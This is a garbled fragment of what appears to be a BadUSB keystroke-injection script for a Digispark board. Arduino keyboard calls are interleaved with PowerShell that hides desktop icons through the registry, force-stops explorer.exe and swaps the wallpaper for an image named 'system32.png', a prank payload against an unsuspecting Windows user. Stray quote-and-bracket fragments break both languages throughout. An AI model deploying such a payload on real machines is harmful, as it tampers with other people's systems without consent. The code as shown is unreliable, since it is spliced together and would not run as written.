  Function Set-WallPaper($Image) {
  DigiKeyboardFr.delay(500);
   New-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name WallpaperStyle -PropertyType String -Value \"10\"  -Force 
  Add-Type -TypeDefinition @\" ")); 
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  using System; 
  using System.Runtime.InteropServices;
  public class Params 
  { 
      [DllImport(\"User32.dll\",CharSet=CharSet.Unicode)] 
      public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam,String lpvParam,Int32 fuWinIni); 
  }
  \"@ 
    
      $SPI_SETDESKWALLPAPER = 0x0014
      $UpdateIniFile = 0x01
      $SendChangeEvent = 0x02
      $fWinIni = $UpdateIniFile -bor $SendChangeEvent
      $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
  }
  $Path=\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" 
  Set-ItemProperty -Path $Path -Name \"HideIcons\" -Value 1 
  Get-Process \"explorer\" | Stop-Process "));
  // taskkill /F /IM explorer.exe
  Set-WallPaper -Image \"C:\\system32.png\"